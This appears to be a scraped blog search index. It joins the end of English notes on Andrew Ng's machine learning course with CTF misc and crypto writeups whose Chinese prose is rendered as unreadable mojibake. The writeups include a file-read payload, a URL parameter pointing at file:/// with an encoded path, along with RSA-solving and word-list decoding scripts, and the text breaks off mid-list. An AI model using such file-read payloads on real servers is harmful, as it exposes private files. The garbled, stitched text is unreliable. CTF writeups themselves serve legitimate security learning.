^{(1)}\u0026hellip;\\Theta ^{(n_m)})$ using gradient descent(or an advanced optimization algorithm). For a user with parameters $\\Theta$ and a movie with(learned) features x, predict a star rating of $\\Theta ^Tx$. 16.5 Vectorizationâ€”â€”Low Rank Matrix Factorization Like matrix multiplication\nFinding related movies:\nFor each product i, we learn a feature vector $x ^{(i)}$.\nsmall $|x ^{(i)}-x ^{(j)}|$ â€”â€”\u0026gt; movie j and movie i are \u0026ldquo;similar\u0026rdquo;.\n16.6 Implementation Detailâ€”â€”Mean Normalization If user Eve hasn\u0026rsquo;t rated any movies. The only Influential part is the last part. We want to choose vector theta 5 so that the last regularization term is as small as possible. We would end up getting a $\\Theta$ that is all 0.\nThe idea of mean normalization will let us fix this problem.\nI\u0026rsquo;m going to compute the average rating($\\mu$) that each movie obtained. All the movie ratings subtract off the mean rating.\nSo, what I\u0026rsquo;m doing is just normalizing each movie to have an average rating of zero.\nNow use this set of ratings with my collaborative filtering algorithm. Our last prediction should be $(\\theta ^{(j)})^T x ^{(i)}+\\mu_i$. This mean user Eve will get the average rating.\n17. Large Scale Machine Learning 17.1 Learning With Large Datasets Before investing the effort into actually developing and the software needed to train these massive models is often a good sanity check, if training on just a thousand examples might do just as well.\nIf we have a high variance model, we may need large datasets.\nIf we have a high bias model, large datasets may don\u0026rsquo;t help.\nSo in large-scale machine learning, we like to come up with computationally reasonable ways, or computationally efficient ways, to deal with very big data sets.\n17.2 Stochastic Gradient Descent we\u0026rsquo;ll talk about a modification to the basic gradient descent algorithm called Stochastic gradient descent, which will allow us to scale these algorithms to much bigger training sets.\nIf dataset is large, it\u0026rsquo;s gonna take a long time in order to get the algorithm to converge.(Batch gradient descent)\nIn contrast to Batch gradient descent, what we are going to do is come up with a different algorithm that doesn\u0026rsquo;t need to look at all the training examples in every single iteration, but that needs to look at only a single training example in one iteration.(Stochastic gradient descent)\n17.3 Mini-Batch Gradient Descent Batch gradient descent: Use all m examples in each iteration\nStochastic gradient descent: Use 1 example in each iteration\nMini-batch gradient descent: Use b examples in each iteration\nb = mini-batch size usually b=10(2-100)\nWhy do we want to look at b examples at a time rather than look at just a single example at a time as the Stochastic gradient descent?\nThe answer is in vectorization.\nMini-batch gradient descent is likely to outperform Stochastic gradient descent only if you have a good vectorized implementation. In that case, the sum over 10 examples can be performed in a more vectorized way which will allow you to partially parallelize your computation over the ten examples.\n17.4 Stochastic Gradient Descent Convergence By using a smaller learning rate, you\u0026rsquo;ll end up with smaller oscillations.\nTo get a smoother curve, you need to increase the number of examples.\nWhen curve looks like it\u0026rsquo;s increasing, what you really should do is use a smaller value of the learning rate alpha.\nIf you want stochastic gradient descent to actually converge to the global minimum, there\u0026rsquo;s one thing which you can do which is you can slowly decrease the learning rate alpha over time.$\\alpha = \\frac{const1}{iterationNumber + const2}$\n17.5 Online Learning For a continuous stream of data from online website.\nWhen a user come in the website, we get a example (x,y) and learn from that and discard it.\nThis sort of online learning algorithm can also adapt to changing user preferences and kind of keep track of what your changing population of users may be willing to pay for.\nThe problem of learning the predicted click-through rate, the predicted CTR.\n17.6 Map Reduce and Data Parallelism Assign tasks to multiple computers on average then centralized master server combine results together.\nOn a single multi-core computer, you can split the training sets into pieces and send the training set to different cores within a single box.\nwe talked about the MapReduce approach to parallelizing machine learning by taking a data and spreading them across many computers in the data center. Although these ideas are critical to parallelizing across multiple cores within a single computer as well.\n18. Application Example: Photo OCR 18.1 Problem Description and Pipeline Photo OCR stands for Photo Optical Character Recognition. The photo OCR problem focuses on how to get computers to read the text to the purest in images that we take.\nFirst, given the picture it has to look through the image and detect where there is text in the picture.\nRead the text in those regions.\nDoing OCR from photographs today is still a very difficult machine learning problem.\nPhoto OCR pipeline:\nText detection Character segmentation Character classification 18.2 Sliding Windows Pedestrian detection:\nSupervised learning for pedestrian detection(sliding windows classifier)\nshift the rectangle over each time is a parameter called the step size(also called the slide parameter)\nwe can choose a big rectangle and resize to the smaller one and get it detected by classifier.\nText detection:\nuse classifier to get the possibility of text apply expansion operator and expand white pixel rule out strange rectangles and draw rectangles around text How do we segment out the individual characters in this image?\nuse a supervised learning to decide if there is split between two characters\n18.3 Getting Lots of Data and Artificial Data One of the most reliable ways to get a high performance machine learning system is to take a low bias learning algorithm and to train it on a massive training set. But where did you get so much training data from?\nArtificial data synthesis [creating new data from scratch, amplify that training set or turn to a large one]\nCreate new: downloaded font\nAmplify: artificial stretching or artificial distortions\nDiscussion on getting more data:\nMake sure you have a low bias classifier before expending the effort. (Plot learning curves). E.g. keep increasing the number of features/number of hidden units in neural network until you have a low bias classifier. â€œHow much work would it be to get 10x as much data as we currently have?â€ Artificial data synthesis Collect/label it yourself Crowd source(E.g. Amazon Mechanical Turk) 18.4 Ceiling Analysisâ€”â€”What Part of the Pipeline to Work on Next go to my test set and just give it the correct answers for the text detection part of the pipeline.\nAnd now going to give the correct text detection output and give the correct character segmentation outputs and manually label the correct segment orientations of text into individual characters.\nNow, the nice thing about having done this analysis analysis is we can now understand what is the upside potential for improving each of these components.\ntext detectionâ€”â€”17 percent performance gain\ncharacter segmentationâ€”â€”1 percent performance gain\ncharacter recognitionâ€”â€”10 percent performance gain\nceiling analysis gives the upside potential\n19. Conclusion 19.1 Summary and Thank You ","description":"","id":29,"section":"posts","tags":["AI","course"],"title":"CS229 Machine Learningâ€”â€”Andrew Ngâ€”â€”Stanford","uri":"https://ruokeqx.gitee.io/posts/machine-learning-andrew-ng-stanford/"},{"content":"2020RoarCTF Misc Writeup ç­¾åˆ° ç­¾åˆ°æ¯”åé¢éš¾ç³»åˆ—.jpg\n1 ?url=file:///%25%36%36%25%36%63%25%36%31%25%36%37 Hi_433MHz æ˜¯é“æ†¨æ†¨æ²¡é”™ï¼Œä¸çœ‹è½¯ä»¶æç¤ºï¼Œå»ºè®®å»çˆ¬ã€‚\nç›´æ¥æ‹–åˆ°audacityæç¤ºå¦‚ä¸‹ã€‚\næŒ‰ç…§ä»–è¯´çš„å¯¼å…¥æ–‡ä»¶ï¼Œæ˜æ˜¾çœ‹åˆ°é•¿çŸ­ï¼Œä¸€ä¸ªä¹ä½ä¸æ˜¯æ‘©æ–¯ï¼Œå…«ä½æ˜¯äºŒè¿›åˆ¶ï¼Œæœ€åä¸€ä½åº”è¯¥æ˜¯å¥‡å¶æ ¡éªŒã€‚\näºæ˜¯æ‰‹æ’¸å¾—åˆ°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 01100110 01101100 01100001 01100111 01111011 00110010 00110101 01100011 00110010 00110001 01100010 00110000 01100100 00101101 00110110 01100001 00110001 00110001 00101101 00110100 00110011 00110001 00110010 00101101 00111001 00110111 00110001 01100010 00101101 00110100 00110010 00111000 01100100 00110000 00110001 01100011 01100100 01100011 00110101 00110011 00110100 01111101 1 flag{25c21b0d-6a11-4312-971b-428d01cdc534} FM è½¯ä»¶è£…äº†ä¸€å¤©ï¼Œæ¯”èµ›ç»“æŸåæ‰çŸ¥é“ç›´æ¥å¬ï¼Œç„¶è€Œè™šæ‹Ÿæœºå£°å¡è¢«æˆ‘åˆ äº†ã€‚\næˆ‘é“æ†¨æ†¨äº†ï¼Œå››èˆäº”å…¥ä¹Ÿç®—æˆ‘akå§çƒçƒäº†ã€‚\n2020SWPUCTF Misc\u0026amp;Crypto Writeup å˜¶å“„æ— çº¿ç”µè‡ªé—­è¿‡æ¥éšä¾¿ç©ä¸€ç©ã€‚\nMisc å¥—å¨ƒ 1 2 # RC4data.txt U2FsdGVkX19uI2lzmxYrQ9mc16y7la7qc7VTS8gLaUKa49gzXPclxRXVsRJxWz/p 1 2 3 4 # æŸ¥çœ‹hexå¾—åˆ°å‹ç¼©åŒ…å¯†ç  6e4c834d77cba03af41e1562a5bce84e # è§£å‹å¾—åˆ°rc4key ABCDEFGHIJKLMNOPQRSTUVWXYZ 1 2 # åœ¨çº¿è§£å¯†å¾—åˆ°flag ef1a73d40977a49b99b871980f355757 è€—å­å°¾æ± è§†é¢‘ä¸­æ˜æ˜¾æœ‰ä¸€ä¸²ä¸œè¥¿é—ªè¿‡\n1 2 3 4 # base64 c2lnbl9pbg== # è§£å¯†å¾—åˆ° sign_in è§†é¢‘å°¾éƒ¨æœ‰ä¸ªzipç”¨ä¸Šé¢å¯†ç è§£å‹å¾—åˆ°å¦‚ä¸‹\n1 2 3 R1pCVE9OUlhHVTNES05SWkdZWVRNUVJYSEEzVEtOUlVHNFpUT09KWEdFM0RLTlJZRzRaVE9RSlhHRTNEUU5aWkdaQkRNTlpXRzQzVEdOWlpHNDRUTVFaV0lJM1RNTlpXR1k0UT09PT0= //The last layer is the single table replacement password base64ï¼Œ32ç„¶å16è¿›åˆ¶è½¬å­—ç¬¦ä¸²\n1 2 3 4 lvueiakxudsyqehszqhykggsyylkvvi fladybuganeshdiephisuccessfully flagyouhavesignedinsuccessfully xxx_xxxx_xxxxxx_xx_xxxxxxxxxxxx æ¥æ‰¾æˆ‘å§ 1 key is PPPaAaS å¾—åˆ°findme.mp3å’Œsecret.rar,fileçœ‹ä¸€ä¸‹å‘ç°findme.mp3æ˜¯rar5,æ”¹åç¼€è§£å‹å¾—åˆ°å“ˆå“ˆå“ˆ.pngå’Œé‡‡èŒ¶çºª.mp3,secret.raræ˜¯çœŸçš„åŠ å¯†ï¼Œç®€å•hashcatçˆ†ç ´äº†ä¸€ä¸‹æ— è§£åº”è¯¥æ˜¯è¦ç»§ç»­æ‰¾å¯†ç äº†ã€‚\néŸ³é¢‘å¼€å¤´æœ‰ç±»ä¼¼äºæ‹¨å·éŸ³ã€‚\næœ«å°¾æœ‰ä¸€æ®µæ‘©æ–¯å¯†ç \nè§£å¯†å¾—åˆ°D43963E92B012AAB æ˜¯ä¸€æ¡è¦é’±çš„md5 ç©·äººä¸é…å‘œå‘œå‘œã€‚hashå‡ºæ¥æ˜¯n1ce_try,è§£å‹secret.rarå¾—åˆ°ä¸€ä¸ªgifå’Œä¸€ä¸ªpng,gifä¸€å¸§å¦‚ä¸‹å›¾ã€‚\nå‘ç°hint.png crcä¸å¯¹ï¼Œä¿®å¤åå¾—åˆ°hint:Veni,Vidi,Viciç›´æ¥æœç´¢è¿™ä¸ªhintå‘ç°æ˜¯å‡¯æ’’\nå‡¯æ’’å¾—åˆ°flag{sWpu_N1c3_Try}\næ¥çŒœè°œå§ å¾—åˆ°probelm.pngï¼Œç”¨zstegåˆ†å‡ºä¸€ä¸ªzip,å…¶å°¾éƒ¨æœ‰å…¶ä»–å†…å®¹ï¼Œåˆ é™¤å³å¯æ­£å¸¸è§£å‹ã€‚å¾—åˆ°uuu.pcapæ˜¯ä¸€ä¸ªé¼ æ ‡æµé‡ï¼Œè¿˜æœ‰ä¸€ä¸ªmi.jpgã€‚\n1 2 # é¼ æ ‡æµé‡å¦‚å›¾ AG\u0026lt;SPACE\u0026gt;DX\u0026lt;SPACE\u0026gt;AG\u0026lt;SPACE\u0026gt;DX\u0026lt;SPACE\u0026gt;AG\u0026lt;SPACE\u0026gt;DX ç›´æ¥å¯¹ADFGXè¡¨è§£å¯†å¾—åˆ°gogogo\n\\ A D F G X A p h q g m D e a y n o F f d x k r G c v s z w X b u t i l ç°åœ¨åªå‰©ä¸‹ä¸€ä¸ªjpgäº†ï¼Œå¸¦å¯†ç çš„jpgéšå†™ç›²çŒœoutguess\nå¾—åˆ°flag{Out9uEsS_1s_V4rY_e4sy}\nCrypto happy ç­¾åˆ°rsa\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 from z3 import * import gmpy2 from Crypto.Util.number import * c=0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9e e=0x872a335 #q + q*p^3 =1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586 # q+q*p**3= #qp + q *p^2 = 1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594 # q*p+q*p**2 # s = Solver() # p = Int(\u0026#39;p\u0026#39;) # q = Int(\u0026#39;q\u0026#39;) # s.add(q+q*p**3==1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586) # s.add(q*p+q*p**2==1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594) # if s.check() == sat: # print(s.model()) q = 827089796345539312201480770649 p = 1158310153629932205401500375817 n=p*q phi = (p-1)*(q-1) d = gmpy2.invert(e,phi) m = pow(c,d,n) print(long_to_bytes(m)) 2020è¥¿æ¹–è®ºå‰‘Miscéƒ¨åˆ†wp è¯´æ˜¯wpï¼Œä¸å¦‚è¯´æ˜¯è¢«è™è®°å½•ï¼Œå•¥éƒ½æ²¡åšå‡ºæ¥ï¼Œé“åºŸç‰©äº†ã€‚å¸Œæœ›çœ‹åˆ°çš„å¸ˆå‚…è½»ç‚¹å–·ã€‚\nå¸Œæœ›æœ‰å¸ˆå‚…èƒ½æŒ‡å¯¼ä¸€ä¸‹å¼Ÿå¼Ÿï¼Œä¸»é¡µæœ‰è”ç³»æ–¹å¼ã€‚\nYusa_yyds å®˜æ–¹wpè¯´çš„éœ‡åŠ¨ä¸€ä¸‹å››ä¸ªåŒ…ï¼Œå’±ä¹Ÿä¸çŸ¥é“ï¼Œå’±ä¹Ÿä¸æ•¢é—®ã€‚\nè¿‡æ»¤å‡ºxboxçš„æµé‡\nusb.addr == \u0026#34;2.15.2\u0026#34; ç›´æ¥ä¸Šå›¾ï¼Œæˆ‘æŠŠæ—¶é—´é—´éš”çš„ç¬¬ä¸€ä¸ªåŒ…éƒ½æ ‡è®°å‡ºæ¥ï¼Œè¿™æ ·å°±å¾ˆæ˜æ˜¾äº†ã€‚\n114514å–32ä½å°å†™md5å°±æ˜¯flag\nPSï¼šåŒå­¦æœ‰æ‰‹æŸ„åˆ°æ—¶å€™æ¥è¯•è¯•çœ‹\nYusapapa ç½‘é¡µæºç æœ‰ä¸ªhintã€‚Biometric listæœåˆ° PGPè¯æ±‡è¡¨ï¼Œgithubæœ‰è§£ç çš„ï¼Œå¾—åˆ°å¦‚ä¸‹\n1 2 3 You can see my collection puzzles in /hint.rar and another /encode.png. By the way,the picture shoud be used \u0026#34;Yusa\u0026#34; is very important in this challenge!! åæ¥è‡ªå·±ä¹Ÿå†™äº†ä¸ªè„šæœ¬ï¼ŒGitHubåœ°å€æ¬¢è¿star\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 cipher = \u0026#34;\u0026#34;\u0026#34; endow gremlin indulge bison flatfoot fallout goldfish bison hockey fracture fracture bison goggles jawbone bison flatfoot gremlin glucose glucose fracture flatfoot indoors gazelle gremlin goldfish bison guidance indulge keyboard keyboard glucose fracture hockey bison gazelle goldfish bison cement frighten gazelle goldfish indoors buzzard highchair fallout highchair bison fallout goldfish flytrap bison fallout goldfish gremlin indoors frighten fracture highchair bison cement fracture goldfish flatfoot gremlin flytrap fracture buzzard guidance goldfish freedom buzzard allow crowfoot jawbone bison indoors frighten fracture bison involve fallout jawbone Burbank indoors frighten fracture bison guidance gazelle flatfoot indoors indulge highchair fracture bison hockey frighten gremlin indulge flytrap bison flagpole fracture bison indulge hockey fracture flytrap bison allow blockade endow indulge hockey fallout blockade bison gazelle hockey bison inverse fracture highchair jawbone bison gazelle goggles guidance gremlin highchair indoors fallout goldfish indoors bison gazelle goldfish bison indoors frighten gazelle hockey bison flatfoot frighten fallout glucose glucose fracture goldfish freedom fracture blackjack blackjack \u0026#34;\u0026#34;\u0026#34; cipher = cipher.split() odd_list = [\u0026#39;aardvark\u0026#39;, \u0026#39;absurd\u0026#39;, \u0026#39;accrue\u0026#39;, \u0026#39;acme\u0026#39;, \u0026#39;adrift\u0026#39;, \u0026#39;adult\u0026#39;, \u0026#39;afflict\u0026#39;, \u0026#39;ahead\u0026#39;, \u0026#39;aimless\u0026#39;, \u0026#39;Algol\u0026#39;, \u0026#39;allow\u0026#39;, \u0026#39;alone\u0026#39;, \u0026#39;ammo\u0026#39;, \u0026#39;ancient\u0026#39;, \u0026#39;apple\u0026#39;, \u0026#39;artist\u0026#39;, \u0026#39;assume\u0026#39;, \u0026#39;Athens\u0026#39;, \u0026#39;atlas\u0026#39;, \u0026#39;Aztec\u0026#39;, \u0026#39;baboon\u0026#39;, \u0026#39;backfield\u0026#39;, \u0026#39;backward\u0026#39;, \u0026#39;banjo\u0026#39;, \u0026#39;beaming\u0026#39;, \u0026#39;bedlamp\u0026#39;, \u0026#39;beehive\u0026#39;, \u0026#39;beeswax\u0026#39;, \u0026#39;befriend\u0026#39;, \u0026#39;Belfast\u0026#39;, \u0026#39;berserk\u0026#39;, \u0026#39;billiard\u0026#39;, \u0026#39;bison\u0026#39;, \u0026#39;blackjack\u0026#39;, \u0026#39;blockade\u0026#39;, \u0026#39;blowtorch\u0026#39;, \u0026#39;bluebird\u0026#39;, \u0026#39;bombast\u0026#39;, \u0026#39;bookshelf\u0026#39;, \u0026#39;brackish\u0026#39;, \u0026#39;breadline\u0026#39;, \u0026#39;breakup\u0026#39;, \u0026#39;brickyard\u0026#39;, \u0026#39;briefcase\u0026#39;, \u0026#39;Burbank\u0026#39;, \u0026#39;button\u0026#39;, \u0026#39;buzzard\u0026#39;, \u0026#39;cement\u0026#39;, \u0026#39;chairlift\u0026#39;, \u0026#39;chatter\u0026#39;, \u0026#39;checkup\u0026#39;, \u0026#39;chisel\u0026#39;, \u0026#39;choking\u0026#39;, \u0026#39;chopper\u0026#39;, \u0026#39;Christmas\u0026#39;, \u0026#39;clamshell\u0026#39;, \u0026#39;classic\u0026#39;, \u0026#39;classroom\u0026#39;, \u0026#39;cleanup\u0026#39;, \u0026#39;clockwork\u0026#39;, \u0026#39;cobra\u0026#39;, \u0026#39;commence\u0026#39;, \u0026#39;concert\u0026#39;, \u0026#39;cowbell\u0026#39;, \u0026#39;crackdown\u0026#39;, \u0026#39;cranky\u0026#39;, \u0026#39;crowfoot\u0026#39;, \u0026#39;crucial\u0026#39;, \u0026#39;crumpled\u0026#39;, \u0026#39;crusade\u0026#39;, \u0026#39;cubic\u0026#39;, \u0026#39;dashboard\u0026#39;, \u0026#39;deadbolt\u0026#39;, \u0026#39;deckhand\u0026#39;, \u0026#39;dogsled\u0026#39;, \u0026#39;dragnet\u0026#39;, \u0026#39;drainage\u0026#39;, \u0026#39;dreadful\u0026#39;, \u0026#39;drifter\u0026#39;, \u0026#39;dropper\u0026#39;, \u0026#39;drumbeat\u0026#39;, \u0026#39;drunken\u0026#39;, \u0026#39;Dupont\u0026#39;, \u0026#39;dwelling\u0026#39;, \u0026#39;eating\u0026#39;, \u0026#39;edict\u0026#39;, \u0026#39;egghead\u0026#39;, \u0026#39;eightball\u0026#39;, \u0026#39;endorse\u0026#39;, \u0026#39;endow\u0026#39;, \u0026#39;enlist\u0026#39;, \u0026#39;erase\u0026#39;, \u0026#39;escape\u0026#39;, \u0026#39;exceed\u0026#39;, \u0026#39;eyeglass\u0026#39;, \u0026#39;eyetooth\u0026#39;, \u0026#39;facial\u0026#39;, \u0026#39;fallout\u0026#39;, \u0026#39;flagpole\u0026#39;, \u0026#39;flatfoot\u0026#39;, \u0026#39;flytrap\u0026#39;, \u0026#39;fracture\u0026#39;, \u0026#39;framework\u0026#39;, \u0026#39;freedom\u0026#39;, \u0026#39;frighten\u0026#39;, \u0026#39;gazelle\u0026#39;, \u0026#39;Geiger\u0026#39;, \u0026#39;glitter\u0026#39;, \u0026#39;glucose\u0026#39;, \u0026#39;goggles\u0026#39;, \u0026#39;goldfish\u0026#39;, \u0026#39;gremlin\u0026#39;, \u0026#39;guidance\u0026#39;, \u0026#39;hamlet\u0026#39;, \u0026#39;highchair\u0026#39;, \u0026#39;hockey\u0026#39;, \u0026#39;indoors\u0026#39;, \u0026#39;indulge\u0026#39;, \u0026#39;inverse\u0026#39;, \u0026#39;involve\u0026#39;, \u0026#39;island\u0026#39;, \u0026#39;jawbone\u0026#39;, \u0026#39;keyboard\u0026#39;, \u0026#39;kickoff\u0026#39;, \u0026#39;kiwi\u0026#39;, \u0026#39;klaxon\u0026#39;, \u0026#39;locale\u0026#39;, \u0026#39;lockup\u0026#39;, \u0026#39;merit\u0026#39;, \u0026#39;minnow\u0026#39;, \u0026#39;miser\u0026#39;, \u0026#39;Mohawk\u0026#39;, \u0026#39;mural\u0026#39;, \u0026#39;music\u0026#39;, \u0026#39;necklace\u0026#39;, \u0026#39;Neptune\u0026#39;, \u0026#39;newborn\u0026#39;, \u0026#39;nightbird\u0026#39;, \u0026#39;Oakland\u0026#39;, \u0026#39;obtuse\u0026#39;, \u0026#39;offload\u0026#39;, \u0026#39;optic\u0026#39;, \u0026#39;orca\u0026#39;, \u0026#39;payday\u0026#39;, \u0026#39;peachy\u0026#39;, \u0026#39;pheasant\u0026#39;, \u0026#39;physique\u0026#39;, \u0026#39;playhouse\u0026#39;, \u0026#39;Pluto\u0026#39;, \u0026#39;preclude\u0026#39;, \u0026#39;prefer\u0026#39;, \u0026#39;preshrunk\u0026#39;, \u0026#39;printer\u0026#39;, \u0026#39;prowler\u0026#39;, \u0026#39;pupil\u0026#39;, \u0026#39;puppy\u0026#39;, \u0026#39;python\u0026#39;, \u0026#39;quadrant\u0026#39;, \u0026#39;quiver\u0026#39;, \u0026#39;quota\u0026#39;, \u0026#39;ragtime\u0026#39;, \u0026#39;ratchet\u0026#39;, \u0026#39;rebirth\u0026#39;, \u0026#39;reform\u0026#39;, \u0026#39;regain\u0026#39;, \u0026#39;reindeer\u0026#39;, \u0026#39;rematch\u0026#39;, \u0026#39;repay\u0026#39;, \u0026#39;retouch\u0026#39;, \u0026#39;revenge\u0026#39;, \u0026#39;reward\u0026#39;, \u0026#39;rhythm\u0026#39;, \u0026#39;ribcage\u0026#39;, \u0026#39;ringbolt\u0026#39;, \u0026#39;robust\u0026#39;, \u0026#39;rocker\u0026#39;, \u0026#39;ruffled\u0026#39;, \u0026#39;sailboat\u0026#39;, \u0026#39;sawdust\u0026#39;, \u0026#39;scallion\u0026#39;, \u0026#39;scenic\u0026#39;, \u0026#39;scorecard\u0026#39;, \u0026#39;Scotland\u0026#39;, \u0026#39;seabird\u0026#39;, \u0026#39;select\u0026#39;, \u0026#39;sentence\u0026#39;, \u0026#39;shadow\u0026#39;, \u0026#39;shamrock\u0026#39;, \u0026#39;showgirl\u0026#39;, \u0026#39;skullcap\u0026#39;, \u0026#39;skydive\u0026#39;, \u0026#39;slingshot\u0026#39;, \u0026#39;slowdown\u0026#39;, \u0026#39;snapline\u0026#39;, \u0026#39;snapshot\u0026#39;, \u0026#39;snowcap\u0026#39;, \u0026#39;snowslide\u0026#39;, \u0026#39;solo\u0026#39;, \u0026#39;southward\u0026#39;, \u0026#39;soybean\u0026#39;, \u0026#39;spaniel\u0026#39;, \u0026#39;spearhead\u0026#39;, \u0026#39;spellbind\u0026#39;, \u0026#39;spheroid\u0026#39;, \u0026#39;spigot\u0026#39;, \u0026#39;spindle\u0026#39;, \u0026#39;spyglass\u0026#39;, \u0026#39;stagehand\u0026#39;, \u0026#39;stagnate\u0026#39;, \u0026#39;stairway\u0026#39;, \u0026#39;standard\u0026#39;, \u0026#39;stapler\u0026#39;, \u0026#39;steamship\u0026#39;, \u0026#39;sterling\u0026#39;, \u0026#39;stockman\u0026#39;, \u0026#39;stopwatch\u0026#39;, \u0026#39;stormy\u0026#39;, \u0026#39;sugar\u0026#39;, \u0026#39;surmount\u0026#39;, \u0026#39;suspense\u0026#39;, \u0026#39;sweatband\u0026#39;, \u0026#39;swelter\u0026#39;, \u0026#39;tactics\u0026#39;, \u0026#39;talon\u0026#39;, \u0026#39;tapeworm\u0026#39;, \u0026#39;tempest\u0026#39;, \u0026#39;tiger\u0026#39;, \u0026#39;tissue\u0026#39;, \u0026#39;tonic\u0026#39;, \u0026#39;topmost\u0026#39;, \u0026#39;tracker\u0026#39;, \u0026#39;transit\u0026#39;, \u0026#39;trauma\u0026#39;, \u0026#39;treadmill\u0026#39;, \u0026#39;Trojan\u0026#39;, \u0026#39;trouble\u0026#39;, \u0026#39;tumor\u0026#39;, \u0026#39;tunnel\u0026#39;, \u0026#39;tycoon\u0026#39;, \u0026#39;uncut\u0026#39;, \u0026#39;unearth\u0026#39;, \u0026#39;unwind\u0026#39;, \u0026#39;uproot\u0026#39;, \u0026#39;upset\u0026#39;, \u0026#39;upshot\u0026#39;, \u0026#39;vapor\u0026#39;, \u0026#39;village\u0026#39;, \u0026#39;virus\u0026#39;, \u0026#39;Vulcan\u0026#39;, \u0026#39;waffle\u0026#39;, \u0026#39;wallet\u0026#39;, \u0026#39;watchword\u0026#39;, \u0026#39;wayside\u0026#39;, \u0026#39;willow\u0026#39;, \u0026#39;woodlark\u0026#39;, \u0026#39;Zulu\u0026#39;] even_list = [\u0026#39;adroitness\u0026#39;, \u0026#39;adviser\u0026#39;, \u0026#39;aftermath\u0026#39;, \u0026#39;aggregate\u0026#39;, \u0026#39;alkali\u0026#39;, \u0026#39;almighty\u0026#39;, \u0026#39;amulet\u0026#39;, \u0026#39;amusement\u0026#39;, \u0026#39;antenna\u0026#39;, \u0026#39;applicant\u0026#39;, \u0026#39;Apollo\u0026#39;, \u0026#39;armistice\u0026#39;, \u0026#39;article\u0026#39;, \u0026#39;asteroid\u0026#39;, \u0026#39;Atlantic\u0026#39;, \u0026#39;atmosphere\u0026#39;, \u0026#39;autopsy\u0026#39;, \u0026#39;Babylon\u0026#39;, \u0026#39;backwater\u0026#39;, \u0026#39;barbecue\u0026#39;, \u0026#39;belowground\u0026#39;, \u0026#39;bifocals\u0026#39;, \u0026#39;bodyguard\u0026#39;, \u0026#39;bookseller\u0026#39;, \u0026#39;borderline\u0026#39;, \u0026#39;bottomless\u0026#39;, \u0026#39;Bradbury\u0026#39;, \u0026#39;bravado\u0026#39;, \u0026#39;Brazilian\u0026#39;, \u0026#39;breakaway\u0026#39;, \u0026#39;Burlington\u0026#39;, \u0026#39;businessman\u0026#39;, \u0026#39;butterfat\u0026#39;, \u0026#39;Camelot\u0026#39;, \u0026#39;candidate\u0026#39;, \u0026#39;cannonball\u0026#39;, \u0026#39;Capricorn\u0026#39;, \u0026#39;caravan\u0026#39;, \u0026#39;caretaker\u0026#39;, \u0026#39;celebrate\u0026#39;, \u0026#39;cellulose\u0026#39;, \u0026#39;certify\u0026#39;, \u0026#39;chambermaid\u0026#39;, \u0026#39;Cherokee\u0026#39;, \u0026#39;Chicago\u0026#39;, \u0026#39;clergyman\u0026#39;, \u0026#39;coherence\u0026#39;, \u0026#39;combustion\u0026#39;, \u0026#39;commando\u0026#39;, \u0026#39;company\u0026#39;, \u0026#39;component\u0026#39;, \u0026#39;concurrent\u0026#39;, \u0026#39;confidence\u0026#39;, \u0026#39;conformist\u0026#39;, \u0026#39;congregate\u0026#39;, \u0026#39;consensus\u0026#39;, \u0026#39;consulting\u0026#39;, \u0026#39;corporate\u0026#39;, \u0026#39;corrosion\u0026#39;, \u0026#39;councilman\u0026#39;, \u0026#39;crossover\u0026#39;, \u0026#39;crucifix\u0026#39;, \u0026#39;cumbersome\u0026#39;, \u0026#39;customer\u0026#39;, \u0026#39;Dakota\u0026#39;, \u0026#39;decadence\u0026#39;, \u0026#39;December\u0026#39;, \u0026#39;decimal\u0026#39;, \u0026#39;designing\u0026#39;, \u0026#39;detector\u0026#39;, \u0026#39;detergent\u0026#39;, \u0026#39;determine\u0026#39;, \u0026#39;dictator\u0026#39;, \u0026#39;dinosaur\u0026#39;, \u0026#39;direction\u0026#39;, \u0026#39;disable\u0026#39;, \u0026#39;disbelief\u0026#39;, \u0026#39;disruptive\u0026#39;, \u0026#39;distortion\u0026#39;, \u0026#39;document\u0026#39;, \u0026#39;embezzle\u0026#39;, \u0026#39;enchanting\u0026#39;, \u0026#39;enrollment\u0026#39;, \u0026#39;enterprise\u0026#39;, \u0026#39;equation\u0026#39;, \u0026#39;equipment\u0026#39;, \u0026#39;escapade\u0026#39;, \u0026#39;Eskimo\u0026#39;, \u0026#39;everyday\u0026#39;, \u0026#39;examine\u0026#39;, \u0026#39;existence\u0026#39;, \u0026#39;exodus\u0026#39;, \u0026#39;fascinate\u0026#39;, \u0026#39;filament\u0026#39;, \u0026#39;finicky\u0026#39;, \u0026#39;forever\u0026#39;, \u0026#39;fortitude\u0026#39;, \u0026#39;frequency\u0026#39;, \u0026#39;gadgetry\u0026#39;, \u0026#39;Galveston\u0026#39;, \u0026#39;getaway\u0026#39;, \u0026#39;glossary\u0026#39;, \u0026#39;gossamer\u0026#39;, \u0026#39;graduate\u0026#39;, \u0026#39;gravity\u0026#39;, \u0026#39;guitarist\u0026#39;, \u0026#39;hamburger\u0026#39;, \u0026#39;Hamilton\u0026#39;, \u0026#39;handiwork\u0026#39;, \u0026#39;hazardous\u0026#39;, \u0026#39;headwaters\u0026#39;, \u0026#39;hemisphere\u0026#39;, \u0026#39;hesitate\u0026#39;, \u0026#39;hideaway\u0026#39;, \u0026#39;holiness\u0026#39;, \u0026#39;hurricane\u0026#39;, \u0026#39;hydraulic\u0026#39;, \u0026#39;impartial\u0026#39;, \u0026#39;impetus\u0026#39;, \u0026#39;inception\u0026#39;, \u0026#39;indigo\u0026#39;, \u0026#39;inertia\u0026#39;, \u0026#39;infancy\u0026#39;, \u0026#39;inferno\u0026#39;, \u0026#39;informant\u0026#39;, \u0026#39;insincere\u0026#39;, \u0026#39;insurgent\u0026#39;, \u0026#39;integrate\u0026#39;, \u0026#39;intention\u0026#39;, \u0026#39;inventive\u0026#39;, \u0026#39;Istanbul\u0026#39;, \u0026#39;Jamaica\u0026#39;, \u0026#39;Jupiter\u0026#39;, \u0026#39;leprosy\u0026#39;, \u0026#39;letterhead\u0026#39;, 